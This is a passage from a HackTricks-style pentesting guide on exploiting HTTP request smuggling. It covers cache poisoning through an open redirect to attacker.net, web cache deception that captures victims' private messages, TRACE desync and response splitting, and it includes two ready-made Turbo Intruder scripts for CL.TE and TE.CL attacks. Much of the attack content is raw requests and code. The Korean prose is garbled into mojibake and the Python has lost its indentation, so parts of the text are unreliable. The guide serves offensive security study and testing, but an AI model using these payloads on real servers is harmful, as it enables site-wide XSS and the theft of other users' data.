ì´ì „ì— ì„œë²„ ì‘ë‹µì„ ë³€ê²½í•˜ì—¬ 404 ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•˜ëŠ” ë°©ë²•ì„ ê´€ì°°í–ˆìŠµë‹ˆë‹¤ (ì°¸ì¡°: [ê¸°ë³¸ ì˜ˆì œ](./#basic-examples)). ìœ ì‚¬í•˜ê²Œ, ì„œë²„ë¥¼ ì†ì—¬ `/static/include.js` ìš”ì²­ì— ëŒ€í•œ ì‘ë‹µìœ¼ë¡œ `/index.html` ì½˜í…ì¸ ë¥¼ ì œê³µí•˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ `/static/include.js` ì½˜í…ì¸ ëŠ” ìºì‹œì—ì„œ `/index.html`ì˜ ë‚´ìš©ìœ¼ë¡œ ëŒ€ì²´ë˜ì–´, `/static/include.js`ì— ëŒ€í•œ ì ‘ê·¼ì´ ì‚¬ìš©ìì—ê²Œ ë¶ˆê°€ëŠ¥í•´ì§€ë©°, ì´ëŠ” ì„œë¹„ìŠ¤ ê±°ë¶€(DoS)ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ê¸°ìˆ ì€ **ì˜¤í”ˆ ë¦¬ë‹¤ì´ë ‰íŠ¸ ì·¨ì•½ì **ì´ ë°œê²¬ë˜ê±°ë‚˜ **ì˜¤í”ˆ ë¦¬ë‹¤ì´ë ‰íŠ¸ë¡œì˜ ì‚¬ì´íŠ¸ ë‚´ ë¦¬ë‹¤ì´ë ‰íŠ¸**ê°€ ìˆì„ ê²½ìš° íŠ¹íˆ ê°•ë ¥í•´ì§‘ë‹ˆë‹¤. ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ `/static/include.js`ì˜ ìºì‹œëœ ì½˜í…ì¸ ë¥¼ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¡œ êµì²´í•  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ì—…ë°ì´íŠ¸ëœ `/static/include.js`ë¥¼ ìš”ì²­í•˜ëŠ” ëª¨ë“  í´ë¼ì´ì–¸íŠ¸ì— ëŒ€í•œ ê´‘ë²”ìœ„í•œ í¬ë¡œìŠ¤ ì‚¬ì´íŠ¸ ìŠ¤í¬ë¦½íŒ…(XSS) ê³µê²©ì„ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

ì•„ë˜ëŠ” **ì‚¬ì´íŠ¸ ë‚´ ë¦¬ë‹¤ì´ë ‰íŠ¸ì™€ ì˜¤í”ˆ ë¦¬ë‹¤ì´ë ‰íŠ¸ë¥¼ ê²°í•©í•œ ìºì‹œ ì˜¤ì—¼ í™œìš©**ì˜ ì˜ˆì‹œì…ë‹ˆë‹¤. ëª©í‘œëŠ” ê³µê²©ìê°€ ì œì–´í•˜ëŠ” JavaScript ì½”ë“œë¥¼ ì œê³µí•˜ê¸° ìœ„í•´ `/static/include.js`ì˜ ìºì‹œ ì½˜í…ì¸ ë¥¼ ë³€ê²½í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Note the embedded request targeting `/post/next?postId=3`. This request will be redirected to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the attacker can redirect the request to their domain (**on-site redirect to open redirect**).

After successful **socket poisoning**, a **GET request** for `/static/include.js` should be initiated. This request will be contaminated by the prior **on-site redirect to open redirect** request and fetch the content of the script controlled by the attacker.

Subsequently, any request for `/static/include.js` will serve the cached content of the attacker's script, effectively launching a broad XSS attack.

### HTTP ìš”ì²­ ë°€ë°˜ì…ì„ ì‚¬ìš©í•˜ì—¬ ì›¹ ìºì‹œ ì†ì„ìˆ˜ë¥¼ ìˆ˜í–‰í•˜ê¸° <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **ì›¹ ìºì‹œ ì˜¤ì—¼ê³¼ ì›¹ ìºì‹œ ì†ì„ìˆ˜ì˜ ì°¨ì´ì ì€ ë¬´ì—‡ì¸ê°€ìš”?**
>
> * **ì›¹ ìºì‹œ ì˜¤ì—¼**ì—ì„œëŠ” ê³µê²©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ìºì‹œì— ì•…ì„± ì½˜í…ì¸ ë¥¼ ì €ì¥í•˜ë„ë¡ ìœ ë„í•˜ê³ , ì´ ì½˜í…ì¸ ê°€ ë‹¤ë¥¸ ì• í”Œë¦¬ì¼€ì´ì…˜ ì‚¬ìš©ìì—ê²Œ ìºì‹œì—ì„œ ì œê³µë©ë‹ˆë‹¤.
> * **ì›¹ ìºì‹œ ì†ì„ìˆ˜**ì—ì„œëŠ” ê³µê²©ìê°€ ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ë‹¤ë¥¸ ì‚¬ìš©ìì˜ ë¯¼ê°í•œ ì½˜í…ì¸ ë¥¼ ìºì‹œì— ì €ì¥í•˜ë„ë¡ ìœ ë„í•˜ê³ , ê³µê²©ìëŠ” ì´í›„ ì´ ì½˜í…ì¸ ë¥¼ ìºì‹œì—ì„œ ê²€ìƒ‰í•©ë‹ˆë‹¤.

The attacker crafts a smuggled request that fetches sensitive user-specific content. Consider the following example:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
ì´ ìŠ¤ë¨¸ê¸€ë§ëœ ìš”ì²­ì´ ì •ì  ì½˜í…ì¸ (ì˜ˆ: `/someimage.png`)ë¥¼ ìœ„í•œ ìºì‹œ í•­ëª©ì„ ì˜¤ì—¼ì‹œí‚¤ë©´, í”¼í•´ìì˜ `/private/messages`ì˜ ë¯¼ê°í•œ ë°ì´í„°ê°€ ì •ì  ì½˜í…ì¸ ì˜ ìºì‹œ í•­ëª© ì•„ë˜ì— ìºì‹œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ, ê³µê²©ìëŠ” ì´ëŸ¬í•œ ìºì‹œëœ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ì„ í†µí•œ TRACE ë‚¨ìš© <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**ì´ ê²Œì‹œë¬¼ì—ì„œ**](https://portswigger.net/research/trace-desync-attack) ì„œë²„ì— TRACE ë©”ì„œë“œê°€ í™œì„±í™”ë˜ì–´ ìˆë‹¤ë©´ HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ìœ¼ë¡œ ì´ë¥¼ ë‚¨ìš©í•  ìˆ˜ ìˆë‹¤ê³  ì œì•ˆí•©ë‹ˆë‹¤. ì´ëŠ” ì´ ë©”ì„œë“œê°€ ì„œë²„ì— ì „ì†¡ëœ ëª¨ë“  í—¤ë”ë¥¼ ì‘ë‹µ ë³¸ë¬¸ì˜ ì¼ë¶€ë¡œ ë°˜ì˜í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
ì‘ë‹µì„ ë‹¤ìŒê³¼ ê°™ì´ ë³´ë‚¼ ê²ƒì…ë‹ˆë‹¤:
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
An example on how to abuse this behaviour would be to **smuggle first a HEAD request**. This request will be responded with only the **headers** of a GET request (**`Content-Type`** among them). And smuggle **immediately after the HEAD a TRACE request**, which will be **reflecting the sent data**.\
As the HEAD response will be containing a `Content-Length` header, the **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** in the response.\
This response will be sent to the next request over the connection, so this could be **used in a cached JS file for example to inject arbitrary JS code**.

### TRACEë¥¼ HTTP ì‘ë‹µ ë¶„í• ì„ í†µí•´ ì•…ìš©í•˜ê¸° <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continue following [**this post**](https://portswigger.net/research/trace-desync-attack) is suggested another way to abuse the TRACE method. As commented, smuggling a HEAD request and a TRACE request it's possible to **control some reflected data** in the response to the HEAD request. The length of the body of the HEAD request is basically indicated in the Content-Length header and is formed by the response to the TRACE request.

Therefore, the new idea would be that, knowing this Content-Length and the data given in the TRACE response, it's possible to make the TRACE response contains a valid HTTP response after the last byte of the Content-Length, allowing an attacker to completely control the request to the next response (which could be used to perform a cache poisoning).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
ì´ëŸ¬í•œ ì‘ë‹µì„ ìƒì„±í•©ë‹ˆë‹¤ (HEAD ì‘ë‹µì— Content-Lengthê°€ ìˆì–´ TRACE ì‘ë‹µì´ HEAD ë³¸ë¬¸ì˜ ì¼ë¶€ê°€ ë˜ê³  HEAD Content-Lengthê°€ ëë‚˜ë©´ ìœ íš¨í•œ HTTP ì‘ë‹µì´ ë°€ë°˜ì…ë˜ëŠ” ë°©ì‹ì„ ì£¼ëª©í•˜ì„¸ìš”):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(â€œarbitrary responseâ€)</script>
```
### HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ì„ HTTP ì‘ë‹µ ë¹„ë™ê¸°í™”ë¡œ ë¬´ê¸°í™”í•˜ê¸°

HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ ì·¨ì•½ì ì„ ë°œê²¬í–ˆì§€ë§Œ ì´ë¥¼ ì–´ë–»ê²Œ ì•…ìš©í• ì§€ ëª¨ë¥´ê² ë‹¤ë©´, ë‹¤ìŒì˜ ë‹¤ë¥¸ ì•…ìš© ë°©ë²•ì„ ì‹œë„í•´ ë³´ì„¸ìš”:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

### ê¸°íƒ€ HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ ê¸°ìˆ 

* ë¸Œë¼ìš°ì € HTTP ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ (í´ë¼ì´ì–¸íŠ¸ ì¸¡)

{% content-ref url="browser-http-request-smuggling.md" %}
[browser-http-request-smuggling.md](browser-http-request-smuggling.md)
{% endcontent-ref %}

* HTTP/2 ë‹¤ìš´ê·¸ë ˆì´ë“œì—ì„œì˜ ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§

{% content-ref url="request-smuggling-in-http-2-downgrades.md" %}
[request-smuggling-in-http-2-downgrades.md](request-smuggling-in-http-2-downgrades.md)
{% endcontent-ref %}

## í„°ë³´ ì¹¨ì…ì ìŠ¤í¬ë¦½íŠ¸

### CL.TE

From [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

From: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Tools

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): ì´ ë„êµ¬ëŠ” ì´ìƒí•œ ìš”ì²­ ìŠ¤ë¨¸ê¸€ë§ ë¶ˆì¼ì¹˜ë¥¼ ì°¾ëŠ” ë° ìœ ìš©í•œ ë¬¸ë²• ê¸°ë°˜ HTTP í¼ì €ì…ë‹ˆë‹¤.

## References

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
* [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
* [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
